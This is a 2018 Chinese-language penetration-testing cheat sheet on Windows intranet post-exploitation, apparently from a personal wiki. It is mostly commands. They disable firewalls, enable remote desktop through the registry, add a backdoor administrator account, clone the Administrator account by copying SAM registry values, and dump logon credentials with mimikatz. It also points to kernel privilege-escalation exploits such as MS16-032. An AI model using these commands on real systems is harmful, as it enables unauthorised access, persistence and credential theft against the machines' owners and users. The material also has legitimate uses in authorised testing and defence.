---
title: 内网渗透windows篇
date: 2018-03-28 20:26:43
updated: 2018-3-28 20:28:00
tags: 内网渗透
categories: 
- 渗透测试
- 内网渗透
---

# 0x00 IP安全策略
```
创建IP安全策略，屏蔽135、445端口。             
netsh ipsec static add policy name=JDDropPort > nul
netsh ipsec static add filterlist name=Port > nul
netsh ipsec static add filter filterlist=Port srcaddr=any dstaddr=Me dstport=445 protocol=TCP > nul
netsh ipsec static add filter filterlist=Port srcaddr=any dstaddr=Me dstport=135 protocol=UDP > nul
netsh ipsec static add filteraction name=Blocked-Access action=block > nul
netsh ipsec static add rule name=Rule1 policy=JDDropPort filterlist=Port filteraction=Blocked-Access > nul
netsh ipsec static set policy name=JDDropPort assign=y > nul


```
# 0x01 防火墙
```
xp-开启
net start MpsSvc
netsh firewall set opmode enable
netsh advfirewall set Allprofile state on
#xp-关闭
net stop MpsSvc
netsh firewall set opmode mode=disable
netsh advfirewall set Allprofile state off
---

windows2003-开启
netsh firewall set opmode disable
netsh advfirewall set Allprofile state on
netsh advfirewall set Currentprofile state on

windows2003-关闭
net stop MpsSvc
netsh firewall set opmode mode=disable
netsh advfirewall set Allprofile state off     

防火墙策略配置旧命令
netsh firewall add portopening TCP 80 "Open Port 80"
delete portopening protocol=UDP port=80

---

win7\win2008\win2012-开启
net start MpsSvc
netsh firewall set opmode enable
netsh advfirewall set Allprofile state on

win7\win2008\win2012-关闭
net stop MpsSvc
netsh firewall set opmode mode=disable
netsh advfirewall set Allprofile state off

---

防火墙策略配置新命令
netsh advfirewall firewall add rule name="屏蔽危险端口TCP" dir=in action=block localport=135,137,138,139,445 remoteip=any protocol=tcp > nul
netsh advfirewall firewall add rule name="屏蔽危险端口UDP" dir=in action=block localport=135,137,138,139,445 remoteip=any protocol=udp > nul
netsh advfirewall firewall add rule name="开启80端口" dir=in action=allow localport=80 remoteip=any protocol=tcp > nul

```
# 0x03 远程桌面
```

tasklist /svc 在输出的内容中查找svchost.exe进程下termservice服务对应的PID。

netstat -ano 查看对应pid的端口。

查询远程桌注册表，1关闭，0开启
reg query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections
开启远程桌面
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

开启远程桌面防火墙策略
netsh firewall set service remoteadmin disable
netsh firewall set service remotedesktop enable

```
# 0x04 用户操作
1.添加管理员用户
```
net user [username] [password] /add
net localgroup Administrators [username] /add
*添加管理员组如果报错，则可能是net start Workstation没有启动，或者安装了安全狗。
net user [username] /active:yes
```
2.克隆管理员

有时服务器禁止普通用户添加到管理员组，可采用克隆方法。
```
查看用户配置文件十六进制值
Reg query HKLM\SAM\SAM\Domains\Account\Users
查看有哪些用户
Reg query HKLM\SAM\SAM\Domains\Account\Users\Names
将guest克隆为管理员，也可以是其他用户，值对应即可。
Reg export HKLM\SAM\SAM\Domains\Account\Users\000001F4 c:\1.reg
Reg export HKLM\SAM\SAM\Domains\Account\Users\000001F5 c:\2.reg
然后将1.reg “F”的键值数据复制下来 替换2.reg里面的”F”键值，重新导入2.reg

```

# 0x05 进程管理

```
windows:
tasklist /svc
taskkill /F /PID 
netstat ano

linux:
ps -ef
top
netstat tunlp
kill -9
```
# 0x06 提取密码

```
privilege::debug
sekurlsa::logonPasswords full

mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit && dir

mimikatz.exe ""privilege::debug"" ""sekurlsa::logonPasswords full"" exit >> log.txt
```

# 0x07 提权poc
```
https://github.com/SecWiki/windows-kernel-exploits
常用：
MS15-015 MS16-032
```


---
本文为原创：转载请注明:https://wiki.viewcn.cn/